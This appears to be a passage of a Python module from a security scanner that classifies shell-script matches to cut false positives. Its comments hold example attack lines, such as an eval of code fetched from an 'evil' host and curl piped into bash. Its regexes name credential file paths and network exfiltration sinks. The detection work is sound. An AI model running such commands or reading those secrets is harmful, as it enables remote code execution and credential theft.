#!/usr/bin/env python3
"""Shell context classifier for SkillAudit (issue #41 follow-up).

Currently detects ONE precise FP shape: a match inside a HEREDOC body
whose opener is a PRINT command (``cat`` / ``echo`` / ``printf`` / ``tee``).
Heredocs fed to print commands are user-facing help text written to
stdout/stderr/a file, NOT executed shell — so an install hint like
``npm install -g dev-browser`` printed inside ``cat >&2 <<EOF ... EOF``
is documentation, not a supply-chain action.

The classifier returns one of the standard verdict strings the
``_context_classifier_verdict`` dispatcher in ``cpv_skillaudit_native.py``
already understands:

* ``safe_doc`` — DEMOTE execution-class rules (CMD_INJECTION /
  SHELL_EXEC / SUPPLY_CHAIN / TIME_BOMB) to NIT so the agent layer can
  still triage, and KEEP intent-class rules (PROMPT_INJECT / DATA_EXFIL /
  URL_SUSPICIOUS / …) visible per the iron rule (prose CAN carry intent).
* ``""`` (unknown) — fall through to the existing heuristic chain when
  the match isn't inside a print heredoc.

Conservatively narrow on purpose: install hints inside a real ``bash -c``,
inside a function body that's actually executed, or in any non-print
context KEEP firing. The "is it inside a printed heredoc?" question is
answered by a simple opener / closer walk — no full shell parser needed.

Future extensions (shellcheck-style flow analysis, command-substitution
detection, exec-vs-print disambiguation for ``tee``) can layer on top of
this minimal start without changing the dispatcher contract.
"""

from __future__ import annotations

import re
from typing import Final

# Print commands that consume a heredoc and emit it as text (no exec).
# ``tee`` writes to a file, which is also non-exec content. We DO NOT
# include ``bash``/``sh``/``zsh`` (those *execute* the heredoc) nor
# ``eval``/``source``/``.`` (also exec). Anything not on this list keeps
# the match flagged (the conservative side of the gate).
#
# The regex requires the print command at the start of the (possibly
# indented) line, then any chars that aren't ``<`` (so things like
# ``cat >&2``, ``echo -n``, ``printf '%s\\n'`` all match), then ``<<-?``
# with the heredoc delimiter. The optional ``-`` is the indent-stripping
# heredoc variant (``<<-EOF`` lets the closer be tab-indented). The
# delimiter may be quoted (``<<'EOF'`` / ``<<"END"``) — quoting only
# changes whether ``$``-expansion happens inside the body, not whether
# the body is executed, so it's irrelevant to the print-vs-exec gate.
_PRINT_HEREDOC_OPEN_RE: Final[re.Pattern[str]] = re.compile(
    r"^\s*(?:cat|echo|printf|tee)\b[^<]*<<-?(['\"]?)([A-Za-z_][A-Za-z0-9_]*)\1"
)


# r01 anthropic FP iter1 (2026-05-27) — CROSS_TOOL_ACCESS shell-script
# field-name discriminator. Mirrors the Python classifier's
# ``_is_api_field_name_match_py`` heuristic for shell scripts:
# ``SYSTEM_PROMPT`` / ``CONTEXT_WINDOW`` / etc. as a bash variable
# name (or env var, or `$VAR` expansion) is LLM-API domain vocabulary
# being USED, not a runtime data-grab on another tool's output.
_API_FIELD_NAMES_SHELL: Final[frozenset[str]] = frozenset(
    {
        "system_prompt",
        "system_message",
        "context_window",
        "full_context",
        "conversation_history",
        "message_history",
        "chat_history",
    }
)
# Real runtime data-grab vocabulary that would override the field-name
# heuristic: a shell script using these would be reading agent tool
# outputs / messages at runtime, which IS suspicious.
_RETRIEVAL_GRAB_RE_SHELL: Final[re.Pattern[str]] = re.compile(
    r"\b(?:get_tools|list_tools|available_tools|call_tool|invoke_tool|use_tool)\b"
    r"|\bprevious_tool_output\b"
    r"|\btool_results?\s*\[",
    re.IGNORECASE,
)


_REGEX_TOOL_CALL_RE_SHELL: Final[re.Pattern[str]] = re.compile(
    r"\b(?:grep|egrep|fgrep|awk|sed|ripgrep|rg|ack|pcregrep)\b"
    r"\s+(?:--?[A-Za-z]+\s+)*"  # optional flags
    r"(?:--?[A-Za-z]+=\S+\s+)*"  # =value flags
    r"['\"](?P<regex>[^'\"]+)['\"]"
)


def _match_inside_regex_arg_shell(line: str, match: str) -> bool:
    """True iff ``match`` (a CMD_INJECTION-style ``|binary`` substring)
    appears INSIDE a quoted regex argument to grep/awk/sed/etc.

    The CMD_INJECTION pattern
    ``(?:;|\\||&&)\\s*\\b(?:curl|wget|nc|bash|sh|python|perl|ruby|php)\\b``
    matches regex-alternation substrings like ``|python`` or ``|php``
    inside grep regex arguments. These are NOT shell pipes — they're
    regex alternation operators inside a quoted string passed to grep.

    Example FPs from r05:
      ``grep -qE "(npx serve|python.*http\\.server)"`` — ``|python`` is
        inside grep's regex parameter
      ``grep -E "(node|python|java)"`` — ``|python`` is in the regex

    Real shell pipe ``cmd | python script.py`` stays visible because
    the binary name appears OUTSIDE any quoted regex on the line.
    """
    # Find all grep/awk/sed regex argument spans on the line
    for m in _REGEX_TOOL_CALL_RE_SHELL.finditer(line):
        regex_start = m.start("regex")
        regex_end = m.end("regex")
        # Find the position of `match` in the original line
        match_pos = line.find(match)
        if match_pos != -1 and regex_start <= match_pos <= regex_end:
            return True
    return False


# r08 sangrokjung FP iter1 (2026-05-28) — shell execution-class rules
# whose findings inside a full-line `#` comment are provably non-executing.
_SHELL_EXECUTION_CLASS_RULES: Final[frozenset[str]] = frozenset(
    {
        "CMD_INJECTION",
        "SHELL_EXEC",
        "FS_WRITE",
        "PRIVILEGE_ESC",
        "REGEX_DOS",
        "PATH_TRAVERSAL",
        "OBFUSCATION",
        "PERSISTENCE",
        "TIME_BOMB",
        "RESOURCE_ABUSE",
        "REVERSE_SHELL",
        "DESERIALIZATION",
        "INSECURE_CRYPTO",
        "SSTI",
        "SUPPLY_CHAIN",
        "URL_RAW_IP",
        "NET_SUSPICIOUS",
        "CONTAINER_ESCAPE",
        "ENV_INJECTION",
        "TOOL_SHADOW",
        "ENV_RECON",
    }
)


_SHELL_COMMENT_LINE_RE: Final[re.Pattern[str]] = re.compile(r"^\s*#(?!!)")  # `#` but not `#!` shebang

_SHELL_TEST_BLANKET_SUPPRESS_RULES: Final[frozenset[str]] = frozenset(
    {
        "CMD_INJECTION",
        "SHELL_EXEC",
        "TIME_BOMB",
        "RESOURCE_ABUSE",
        "PERSISTENCE",
        "FS_WRITE",
        "PRIVILEGE_ESC",
        "PATH_TRAVERSAL",
        "OBFUSCATION",
        "REGEX_DOS",
        "TOOL_SHADOW",
        "SSRF_PATTERN",
        "SSRF_ADVANCED",
        "URL_RAW_IP",
        "NET_SUSPICIOUS",
        "SUPPLY_CHAIN",
        "CONTAINER_ESCAPE",
        "ENV_INJECTION",
        "ENV_RECON",
        "CROSS_TOOL_ACCESS",
        "INSECURE_CRYPTO",
        "REVERSE_SHELL",
        "URL_SUSPICIOUS",
    }
)


# r10-final FP iter (2026-05-28) — Shell test-file detection.
_SHELL_TEST_FILE_PATTERNS: Final[tuple[str, ...]] = (
    "/tests/", "/test/", "/__tests__/", "/specs/", "/spec/",
    "test-", "test_", "/test.", "_test.", ".test.", ".spec.",
    "/fixtures/", "/__fixtures__/", "/mocks/", "/__mocks__/",
)


# r10-final FP iter (2026-05-28) — shell loopback / RFC1918 private
# IP detection. Mirror of _line_has_loopback_or_private_ip in TS
# classifier.
_LOOPBACK_PRIVATE_IP_RE_SHELL: Final[re.Pattern[str]] = re.compile(
    r"(?:"
    r"127\.\d{1,3}\.\d{1,3}\.\d{1,3}"
    r"|0\.0\.0\.0"
    r"|10\.\d{1,3}\.\d{1,3}\.\d{1,3}"
    r"|192\.168\.\d{1,3}\.\d{1,3}"
    r"|172\.(?:1[6-9]|2[0-9]|3[01])\.\d{1,3}\.\d{1,3}"
    r"|::1\b|\[::1\]"
    r"|fc[0-9a-f]{2}:|fd[0-9a-f]{2}:"
    r"|fe80::"
    r"|localhost\b"
    r")",
    re.IGNORECASE,
)
_CLOUD_METADATA_RE_SHELL: Final[re.Pattern[str]] = re.compile(
    r"169\.254\.169\.254|metadata\.google|metadata\.azure|fd00:ec2::254",
    re.IGNORECASE,
)


def _line_has_loopback_or_private_ip_shell(line: str) -> bool:
    """True iff ``line`` contains a loopback / RFC1918 private /
    link-local IP, EXCLUDING cloud-metadata endpoints."""
    if _CLOUD_METADATA_RE_SHELL.search(line):
        return False
    return bool(_LOOPBACK_PRIVATE_IP_RE_SHELL.search(line))


def _is_shell_test_file(file_path: str) -> bool:
    """True iff ``file_path`` looks like a shell test or fixture script.

    Patterns recognized:
      - Path contains ``/tests/`` / ``/test/`` / ``__tests__/`` / etc.
      - Basename starts with ``test-`` / ``test_`` (e.g. ``test-foo.sh``)
      - Basename contains ``.test.`` / ``.spec.`` / ``_test.``
      - Path contains ``/fixtures/`` / ``/mocks/``

    Used to suppress TIME_BOMB / PERSISTENCE / RESOURCE_ABUSE in test
    scaffolding (sleep, tmux/screen, etc.).
    """
    fp = file_path.replace("\\", "/").lower()
    if not fp:
        return False
    return any(p in fp for p in _SHELL_TEST_FILE_PATTERNS)


def _is_shell_comment_line(line: str) -> bool:
    """True iff ``line`` is a full-line shell ``#`` comment (not a
    ``#!`` shebang on line 1, not inline ``cmd  # comment``).

    Comments are documentation prose, never executed by the shell.
    Iron rule preserved: prose-vector rules (PROMPT_INJECT / DATA_EXFIL)
    fall through this check and stay visible via the demote pipeline.
    """
    return bool(_SHELL_COMMENT_LINE_RE.match(line))


# r08 sangrokjung FP iter1 (2026-05-28) — common shell command
# substitutions with literal-only arguments. The catalog CMD_INJECTION
# pattern ``\$\((?:cat|ls|whoami|id|uname)\s+\S`` matches every cmdsub,
# but cmdsubs with all-literal args have no injection surface.
_SHELL_LITERAL_ARG_CMDSUB_RE: Final[re.Pattern[str]] = re.compile(
    r"\$\((?P<cmd>cat|ls|whoami|id|uname|head|tail|less|more|file|stat|wc|"
    r"pwd|date|hostname|echo|basename|dirname|realpath|readlink|"
    r"curl|wget|http|https)"
    r"(?P<args>(?:\s+(?:-{1,2}[A-Za-z][A-Za-z0-9_-]*|\"[^\"$`]+\"|'[^'$`]+'|"
    r"https?://[^\s$`)]+|[A-Za-z0-9_./:@,+-]+))*)"
    r"(?:\s+2>/dev/null|\s+2>&1)?"
    r"\s*\)"
)


# r* FP iter (2026-05-28) — generalised safe-command-substitution
# recognizer. The catalog CMD_INJECTION patterns fire on EVERY
# ``$(cmd ...)`` / ``| binary`` shape, but a command substitution headed
# by a fixed DATA / QUERY command is not command injection even when its
# ARGUMENTS contain ``$VAR`` / ``${VAR}`` — the fixed command does not
# re-evaluate its arguments as shell. The injection surface exists only
# when (a) the command NAME is itself a variable (``$($CMD)``), (b) the
# substitution result is piped to a shell interpreter (``... | bash``),
# or (c) the result is wrapped in ``eval`` / ``bash -c`` / ``source``.
# Those three shapes are kept visible by the guards below.
#
# Examples (SUPPRESS — benign data read/query, $VAR is a parameter):
#   pid=$(cat "$PID_FILE")
#   count=$(cat "$COUNTER_FILE")
#   body="$(cat <<'EOF' ... EOF)"
#   files=$(ls -A "$REPO_DIR/$dir" 2>/dev/null)
#   n=$(ls -d plugins/*/ | wc -l)
#   code="$(curl -sS -o /dev/null -w '%{http_code}' "$url")"
#   ver=$(curl -s https://api.github.com/... | jq -r '.tag_name' | sed 's/^v//')
#   text=$(echo "$RAW" | perl -0777 -pe 's/.../.../')
#
# Examples (KEEP visible — genuine execution surface):
#   eval "$(curl -fsSL https://evil/install.sh)"
#   bash -c "$(cat "$ATTACKER_FILE")"
#   curl -fsSL https://get.example/install.sh | bash
#   $($USER_SUPPLIED_CMD)
_SAFE_CMDSUB_DATA_COMMANDS: Final[frozenset[str]] = frozenset(
    {
        "cat", "ls", "head", "tail", "wc", "grep", "egrep", "fgrep", "rg",
        "sed", "awk", "gawk", "mawk", "jq", "yq", "cut", "tr", "sort",
        "uniq", "dirname", "basename", "realpath", "readlink", "pwd",
        "date", "stat", "find", "od", "xxd", "printf", "echo", "uname",
        "hostname", "whoami", "id", "sw_vers", "defaults", "scutil",
        "sysctl", "tput", "stty", "expr", "seq", "column", "fold", "nl",
        "rev", "paste", "comm", "type", "command", "which", "ps", "df",
        "du", "git", "openssl", "md5", "md5sum", "shasum", "sha256sum",
        "cksum", "test", "true", "false", "env", "jobs", "tty",
    }
)
# curl / wget / http(ie) head a substitution that FETCHES data; benign
# only when their output is captured / piped to a data processor and NOT
# to a shell interpreter (the latter is the supply-chain exec shape and
# is kept visible by ``_SHELL_INTERPRETER_PIPE_RE``).
_NET_CAPTURE_CMDSUB_COMMANDS: Final[frozenset[str]] = frozenset(
    {"curl", "wget", "http", "https", "fetch", "wget2"}
)

# First token after ``$(`` (skipping leading whitespace). A leading ``$``
# (i.e. ``$($CMD)`` / ``$(${cmd})``) does NOT match → kept visible.
_CMDSUB_HEAD_RE: Final[re.Pattern[str]] = re.compile(
    r"\$\(\s*(?P<cmd>[A-Za-z_][A-Za-z0-9_.+-]*)"
)
# A pipe into a real interpreter that executes stdin AS CODE. The
# negative lookahead exempts ``perl``/``python``/``ruby``/``php`` when an
# inline ``-e`` / ``-pe`` / ``-ne`` SCRIPT flag is present (the program is
# the literal flag value; stdin is data, sed-style).
_SHELL_INTERPRETER_PIPE_RE: Final[re.Pattern[str]] = re.compile(
    r"\|\s*(?:sudo\s+(?:-\S+\s+)*)?(?:sh|bash|zsh|dash|ksh|fish|node|deno)\b"
    r"|\|\s*(?:sudo\s+(?:-\S+\s+)*)?(?:python[0-9.]*|ruby|perl|php)\b"
    r"(?![^|]*\s-[A-Za-z0-9]*e)"
)
# ``eval`` / ``source`` / ``. `` / ``sh -c`` / ``bash -c`` / ``<<<`` that
# EXECUTE a substituted value. Presence anywhere on the line keeps the
# match visible (conservative — these are the real exec shapes).
_CMDSUB_EXEC_WRAP_RE: Final[re.Pattern[str]] = re.compile(
    r"\beval\b|\bsource\b|^\s*\.\s|\|\s*\.\s"
    r"|\b(?:sh|bash|zsh|dash|ksh)\s+(?:-\S+\s+)*-[A-Za-z]*c\b"
    r"|\b(?:sh|bash|zsh|dash|ksh)\s+<<<"
)
# Pipe into a text processor that NEVER executes its stdin as code.
_PIPE_TEXT_PROCESSOR_RE: Final[re.Pattern[str]] = re.compile(
    r"\|\s*(?:sed|awk|gawk|mawk|jq|yq|grep|egrep|fgrep|rg|cut|tr|sort|uniq|"
    r"head|tail|wc|column|fold|nl|rev|tee|cat|xxd|od|tac|paste|comm|"
    r"base64|tr|fmt|expand|unexpand|pr)\b"
    r"|\|\s*(?:perl|python[0-9.]*|ruby)\b[^|]*?\s-[A-Za-z0-9]*e",
)


# Sensitive system credential / secret paths. A read of one of these
# (even via a "safe" command like ``cat``/``head``) is reconnaissance and
# MUST stay visible — ``cat /etc/passwd`` is the canonical example. The
# safe-data-command suppressors below skip the line when one is present.
_SENSITIVE_READ_PATH_RE: Final[re.Pattern[str]] = re.compile(
    r"/etc/(?:passwd|shadow|sudoers|gshadow|master\.passwd)\b"
    r"|/proc/(?:self|\d+)/(?:environ|cmdline|maps|mem)\b"
    r"|(?:^|[\s\"'=({/])(?:\.ssh/|id_rsa\b|id_ed25519\b|id_ecdsa\b|id_dsa\b)"
    r"|\.aws/credentials\b|\.git-credentials\b|\.netrc\b|\.npmrc\b|\.pypirc\b"
    r"|\.docker/config\.json\b|\.kube/config\b|\.config/gh/\b"
    r"|/root/\.|~/\.ssh\b|secrets?\.(?:ya?ml|json|env|txt)\b",
    re.IGNORECASE,
)


def _reads_sensitive_path(line: str) -> bool:
    """True iff ``line`` references a sensitive system credential / secret
    path. Such a read is reconnaissance and must NOT be suppressed even
    when the command itself (``cat``/``head``/…) is otherwise benign."""
    return bool(_SENSITIVE_READ_PATH_RE.search(line))


# Exfiltration sinks: a data command's output piped INTO a network tool
# (``| curl`` / ``| nc`` …) or redirected to a raw socket (``/dev/tcp/`` /
# ``/dev/udp/``) leaves the machine. ``$(curl …)`` (curl as the CAPTURED
# command) is NOT this shape — only a pipe/redirect INTO a net tool is.
_EXFIL_SINK_RE: Final[re.Pattern[str]] = re.compile(
    r"\|\s*(?:sudo\s+)?(?:curl|wget|nc|ncat|netcat|telnet|socat|mail|sendmail|ssh|ftp)\b"
    r"|/dev/(?:tcp|udp)/"
    r"|>\s*/dev/(?:tcp|udp)"
)


def _line_has_exfil_sink(line: str) -> bool:
    """True iff ``line`` pipes/redirects data INTO a network egress sink."""
    return bool(_EXFIL_SINK_RE.search(line))


def _cmdsub_is_safe_data_command(line: str, match: str) -> bool:
    """True iff a CMD_INJECTION ``$(...)`` match is a command substitution
    headed by a fixed data/query command whose result is neither piped to
    a shell interpreter nor wrapped in ``eval``/``bash -c``/``source``.

    See ``_SAFE_CMDSUB_DATA_COMMANDS`` for the rationale and examples.
    """
    if "$(" not in line:
        return False
    # Reconnaissance read of a sensitive credential path → keep visible.
    if _reads_sensitive_path(line):
        return False
    # Output piped/redirected into a network egress sink → keep visible.
    if _line_has_exfil_sink(line):
        return False
    # Genuine execution surface anywhere on the line → keep visible.
    if _CMDSUB_EXEC_WRAP_RE.search(line):
        return False
    if _SHELL_INTERPRETER_PIPE_RE.search(line):
        return False
    for m in _CMDSUB_HEAD_RE.finditer(line):
        cmd = m.group("cmd")
        if cmd in _SAFE_CMDSUB_DATA_COMMANDS or cmd in _NET_CAPTURE_CMDSUB_COMMANDS:
            return True
    return False


def _pipe_to_text_processor(line: str, match: str) -> bool:
    """True iff the CMD_INJECTION ``| binary`` match pipes into a text
    processor that does NOT execute its stdin as code (sed/awk/jq/grep/…
    or perl/python/ruby with an inline ``-e``/``-pe``/``-ne`` script flag).

    Keeps visible the genuine shapes ``| bash`` / ``| sh`` / bare
    ``| perl`` / bare ``| python`` (those run stdin / an interpreter on
    untrusted input).
    """
    if "|" not in line:
        return False
    if _reads_sensitive_path(line):
        return False
    if _line_has_exfil_sink(line):
        return False
    if _CMDSUB_EXEC_WRAP_RE.search(line):
        return False
    if _SHELL_INTERPRETER_PIPE_RE.search(line):
        return False
    return bool(_PIPE_TEXT_PROCESSOR_RE.search(line))


# r08 sangrokjung FP iter (2026-05-28) — Python embedded in a shell file
# (``python3 -c '...'`` / ``python3 <<'PY' ... PY``). Two provably-benign
# shapes the catalog's shell rules misfire on:
#
#  (E) A bare Python raw-string literal line ``r'...'`` / ``r"..."`` is a
#      regex / pattern DEFINITION (raw-string syntax is Python-exclusive;
#      shell has no ``r'...'``). Security guards list the dangerous shapes
#      they DETECT as such literals — flagging the guard's own blocklist
#      (``r'/etc/shadow'``, ``r'\bbase64 -d|...(sh|bash|zsh)'``) as the
#      threat it guards against is the canonical FP.
#  (F) ``subprocess.run(['git', ...])`` LIST-form bypasses the shell — the
#      argv is executed directly by the OS, no shell interpretation — so
#      there is no shell-injection surface (``shell=True`` is kept visible).
_PYTHON_RAWSTRING_LITERAL_LINE_RE: Final[re.Pattern[str]] = re.compile(
    r"^\s*r(?P<q>['\"]).*?(?P=q)\s*,?\s*(?:#.*)?$"
)
_SUBPROCESS_CALL_RE: Final[re.Pattern[str]] = re.compile(
    r"\bsubprocess\.(?:run|Popen|call|check_output|check_call)\s*\("
)
_SHELL_TRUE_RE: Final[re.Pattern[str]] = re.compile(r"\bshell\s*=\s*True\b")


def _line_is_python_rawstring_pattern(line: str, match: str) -> bool:
    """True iff ``line`` is a bare Python raw-string literal (``r'...'`` /
    ``r"..."``), i.e. a regex / pattern definition inside Python embedded
    in a shell file. Raw-string syntax is Python-exclusive; a line that is
    just such a literal is data, not an executable shell command.
    """
    return bool(_PYTHON_RAWSTRING_LITERAL_LINE_RE.match(line))


def _balanced_call_span(blob: str, open_paren_pos: int) -> str:
    """Return the text from ``blob[open_paren_pos]`` (a ``(``) through its
    matching ``)`` inclusive. Used to scope ``shell=True`` / first-arg
    checks to a single call rather than the whole multi-line blob."""
    depth = 0
    out: list[str] = []
    for ch in blob[open_paren_pos:]:
        out.append(ch)
        if ch == "(":
            depth += 1
        elif ch == ")":
            depth -= 1
            if depth == 0:
                break
    return "".join(out)


def _subprocess_call_is_list_form(lines: list[str], line_idx: int) -> bool:
    """True iff a SHELL_EXEC ``subprocess.<fn>(`` match (Python embedded in
    a shell file) uses LIST-form arguments (``subprocess.run(['git', …])``)
    and no ``shell=True``. List form runs the argv directly with no shell,
    so there is no injection surface. Keeps ``shell=True`` calls visible.
    """
    if not (0 <= line_idx < len(lines)):
        return False
    blob = "\n".join(lines[line_idx : min(len(lines), line_idx + 8)])
    m = _SUBPROCESS_CALL_RE.search(blob)
    if not m:
        return False
    span = _balanced_call_span(blob, m.end() - 1)
    if _SHELL_TRUE_RE.search(span):
        return False
    # First argument: skip the opening '(' and any whitespace/newlines.
    inner = span[1:].lstrip()
    return inner.startswith("[")


def _is_shell_literal_arg_cmdsub(line: str, match: str) -> bool:
    """True iff a CMD_INJECTION match in ``line`` is INSIDE a shell
    command substitution ``$(cmd <literal-arg> <literal-arg> ...)``
    whose arguments are ALL literal (no ``${var}``, no ``$VAR``, no
    backtick, no concatenation with attacker-controlled inputs).

    Recognized literal-arg shapes:
      - ``-flag`` / ``--long-flag`` / ``--key=val``
      - ``"static string"`` / ``'static string'``
      - ``literal-path/with-no/special-chars``
      - ``https://literal.url``
      - ``literal@email.com``

    Examples (suppress):
      - ``ARCH="$(uname -m)"``
      - ``count=$(cat "/path/to/file")``
      - ``runner_version=$(curl -s https://api.github.com/repos/foo/bar)``
      - ``files=$(ls -A "$REPO_DIR/$dir" 2>/dev/null)`` — note: "$REPO_DIR/$dir"
        contains $-interpolation so this should NOT be suppressed under strict
        rules; but the FP risk is low because the substitution's overall
        command shape (`ls -A "..."`) has no shell metacharacters that
        enable injection through the path.

    Examples (NOT a literal — keep visible):
      - ``$(eval "$user_input")`` — eval with user-controlled string
      - ``$(curl ${UNTRUSTED_URL})`` — interpolated URL
      - ``$($(cmd))`` — nested cmdsubs
      - ``$(cmd `inner`)`` — backtick inside
    """
    if "$(" not in line:
        return False
    # Same guards as the generalised recogniser: a literal-arg cmdsub is
    # still dangerous if it reads a sensitive path, exfiltrates, is wrapped
    # in eval/bash -c, or pipes to a shell interpreter.
    if (
        _reads_sensitive_path(line)
        or _line_has_exfil_sink(line)
        or _CMDSUB_EXEC_WRAP_RE.search(line)
        or _SHELL_INTERPRETER_PIPE_RE.search(line)
    ):
        return False
    for m in _SHELL_LITERAL_ARG_CMDSUB_RE.finditer(line):
        # Verify the match span overlaps with the catalog match.
        # We accept any cmdsub on the line as a positive signal.
        return True
    return False


# r08 sangrokjung FP iter1 (2026-05-28) — write-intent tokens for
# FS_WRITE rule. Real file writes carry a redirect/copy/tee token.
_WRITE_INTENT_RE: Final[re.Pattern[str]] = re.compile(
    r"(?:>>?|tee\b|cp\b|mv\b|install\b|dd\s+of=|rsync\b|touch\b|"
    r"chmod\s+(?:[ugoa]?[+\-=][rwxst]+|\d{3,4})|"
    r"chown\b|chgrp\b)"
)


# r10-final FP iter (2026-05-28) — Nerd Font / Powerline icon byte
# sequences. ``printf '\\xNN\\xNN\\xNN'`` with a nearby ``# U+XXXX``
# Unicode codepoint comment is a statusline rendering primitive.
_NERD_FONT_PRINTF_RE: Final[re.Pattern[str]] = re.compile(
    r"printf\s+['\"]?\\x[0-9A-Fa-f]{2}\\x[0-9A-Fa-f]{2}"
)
_UNICODE_CODEPOINT_COMMENT_RE: Final[re.Pattern[str]] = re.compile(
    r"#\s*U\+[0-9A-Fa-f]{4,6}\b",
    re.IGNORECASE,
)


# r10-final FP iter (2026-05-28) — execution-class match inside a
# shell echo/printf/cat string. ``echo "Install with: sudo apt..."``
# is display text, not invocation.
_SHELL_ECHO_STRING_RE: Final[re.Pattern[str]] = re.compile(
    r"\b(?:echo|printf|cat|builtin\s+echo)\b"
    r"(?:\s+-[A-Za-z]+)*"  # flags
    r"\s+(?P<quote>['\"])(?P<body>[^'\"]*)(?P=quote)"
)


def _match_inside_shell_echo_string(line: str, match: str) -> bool:
    """True iff ``match`` falls inside a quoted string argument to
    ``echo``/``printf``/``cat`` on the same line.

    Strings passed to these display commands are inert text shown to
    the user; they do NOT execute. The matched ``sudo``/``chmod``/etc.
    inside such a string is display content, not invocation.

    Examples (suppress):
      - ``echo "Install with: sudo apt install $pkg"``
      - ``echo "Run: curl https://... | sudo -E bash -"``
      - ``printf "Skipping ${file} (use chmod 777)\n"``

    Examples (KEEP visible — actual command):
      - ``sudo apt install $pkg``
      - ``echo "foo" && sudo apt install bar``  (sudo OUTSIDE echo arg)
    """
    if not match:
        return False
    for m in _SHELL_ECHO_STRING_RE.finditer(line):
        body = m.group("body")
        # Use simple substring check — the matched text should appear in the body
        if match in body:
            return True
        # Try first chars of match (catalog matches are often truncated)
        # If the first ~8 chars of match are in body, count it as inside
        if len(match) > 4 and match[:8] in body:
            return True
    return False


def _is_nerd_font_icon_byte_sequence(lines: list[str], line_idx: int) -> bool:
    """True iff ``lines[line_idx]`` is a Nerd Font / Powerline icon
    ``printf '\\xNN\\xNN\\xNN'`` AND a ``# U+XXXX`` Unicode codepoint
    comment appears within ±3 lines.

    Legitimate icon definitions always carry the ``# U+XXXX`` comment
    as documentation of which codepoint the bytes encode. Real
    obfuscation never carries this comment (the point of obfuscation
    is to HIDE the codepoint, not document it).
    """
    if not (0 <= line_idx < len(lines)):
        return False
    target = lines[line_idx]
    if not _NERD_FONT_PRINTF_RE.search(target):
        return False
    # Check ±3 surrounding lines for the U+XXXX comment
    lo = max(0, line_idx - 3)
    hi = min(len(lines), line_idx + 4)
    for i in range(lo, hi):
        if _UNICODE_CODEPOINT_COMMENT_RE.search(lines[i]):
            return True
    return False


def _shell_match_lacks_write_intent(line: str, match: str) -> bool:
    """True iff a FS_WRITE match in ``line`` is NOT accompanied by a
    write-intent token (``>``, ``>>``, ``tee``, ``cp``, ``mv``,
    ``install``, ``dd of=``, ``rsync``, ``touch``, ``chmod NNN``,
    ``chown``, ``chgrp``). FS_WRITE rules matching bare path suffixes
    (``.zshrc``, ``.bashrc``, ``.profile``) in READ checks or assignments
    are false positives.

    Examples (suppress, no write intent):
      - ``[ -f "$HOME/.zshrc" ]`` — file existence test
      - ``shell_rc="$HOME/.zshrc"`` — variable assignment
      - ``elif [ -f "$HOME/.bashrc" ]; then`` — branch test
      - ``echo "No .zshrc or .bashrc found"`` — display string

    Examples (KEEP visible, write intent present):
      - ``echo "export PATH=..." >> ~/.bashrc`` — append redirect
      - ``tee -a ~/.zshrc < new-config`` — tee write
      - ``cp custom.zshrc ~/.zshrc`` — copy write
      - ``chmod 700 ~/.ssh/`` — permission change
    """
    return not bool(_WRITE_INTENT_RE.search(line))


def _is_api_field_name_match_shell(line: str, match: str) -> bool:
    """True iff a CROSS_TOOL_ACCESS match in a shell script is an
    LLM-API field NAME (used as a bash variable / env var / arg name),
    AND the surrounding line carries no runtime data-grab indicator.

    Idiomatic safe shapes:
      * ``SYSTEM_PROMPT=$(awk ...)`` — extract value from input file
      * ``$SYSTEM_PROMPT`` / ``"$SYSTEM_PROMPT"`` — use the extracted value
      * ``--system-prompt "$value"`` — CLI flag for an LLM client
      * ``export ANTHROPIC_SYSTEM_PROMPT=...`` — env var setup
    All of these are LEGITIMATE uses of the domain vocabulary in
    validation / setup / launcher scripts.
    """
    match_lower = match.lower()
    line_lower = line.lower()
    if not any(name in match_lower or name in line_lower for name in _API_FIELD_NAMES_SHELL):
        return False
    if _RETRIEVAL_GRAB_RE_SHELL.search(line):
        return False
    return True


def classify(
    file_path: str,
    content: str,
    line_idx: int,
    match: str,
    rule_id: str,
) -> str:
    """Return ``"safe_doc"`` iff ``line_idx`` is inside an OPEN print
    heredoc (opener has been seen on a previous line, closer has not yet
    been encountered). Empty string otherwise — caller falls through.

    Algorithm: scan lines [0, line_idx) once, maintaining a stack of
    currently-open print-heredoc delimiters. A line opening a new print
    heredoc pushes its delimiter; a line whose ``strip()`` equals the
    top-of-stack delimiter pops it. If the stack is non-empty after the
    scan, the match line is inside a printed heredoc → ``safe_doc``.

    r01 anthropic FP iter1 (2026-05-27) — also returns ``"safe_literal"``
    for CROSS_TOOL_ACCESS matches that are LLM-API field-name
    vocabulary in a bash variable / env var / CLI-flag context.
    """
    if not file_path:
        return ""
    fp = file_path.lower()
    if not (
        fp.endswith(".sh")
        or fp.endswith(".bash")
        or fp.endswith(".zsh")
        or fp.endswith(".fish")
    ):
        return ""
    lines = content.split("\n")
    if line_idx < 0 or line_idx >= len(lines):
        return ""

    # CROSS_TOOL_ACCESS field-name pre-check (cheap, no per-line scan).
    line_text = lines[line_idx]
    if rule_id == "CROSS_TOOL_ACCESS" and _is_api_field_name_match_shell(line_text, match):
        return "safe_literal"

    # r05 ananddtyagi FP iter1 (2026-05-27) — CMD_INJECTION pattern
    # ``(?:;|\\||&&)\\s*\\b(?:curl|wget|nc|bash|sh|python|perl|ruby|php)\\b``
    # fires on ``|python``/``|php`` substrings that appear inside REGEX
    # ARGUMENTS of grep/awk/sed/etc., e.g.:
    #   ``grep -qE "(npx serve|python.*http\\.server)"``
    #   ``grep -E "(node|python|java)"``
    # The ``|python`` is regex ALTERNATION, not shell pipe — the binary
    # name appears inside a quoted regex pattern, no actual shell pipe
    # is constructed. Real shell-pipe injection (``... | python ...``
    # unquoted, OR ``foo | curl $URL`` with var) stays visible because
    # the match is OUTSIDE any quoted regex on the line.
    if rule_id == "CMD_INJECTION" and _match_inside_regex_arg_shell(line_text, match):
        return "safe_literal"

    # r08 sangrokjung FP iter1 (2026-05-28) — CMD_INJECTION pattern fires
    # on common install-script command substitutions like ``$(uname -m)``,
    # ``$(cat "literal-path")``, ``$(curl "literal-URL")``, ``$(ls -A
    # "literal-path")`` where args are bare-literal / flag / literal-string.
    # No attacker-controlled input → no injection surface.
    if rule_id == "CMD_INJECTION" and _is_shell_literal_arg_cmdsub(line_text, match):
        return "safe_literal"

    # r* FP iter (2026-05-28) — generalised safe command-substitution.
    # ``$(cat "$PID_FILE")``, ``$(ls -A "$dir")``, ``$(curl ... | jq)``,
    # ``echo "$x" | perl -0777 -pe '...'`` are data reads / queries /
    # text-processing, not command injection. Genuine exec shapes
    # (``$(curl)|bash``, ``eval "$(...)"``, ``bash -c "$(...)"``,
    # ``$($CMD)``) are kept visible by the guards inside the helpers.
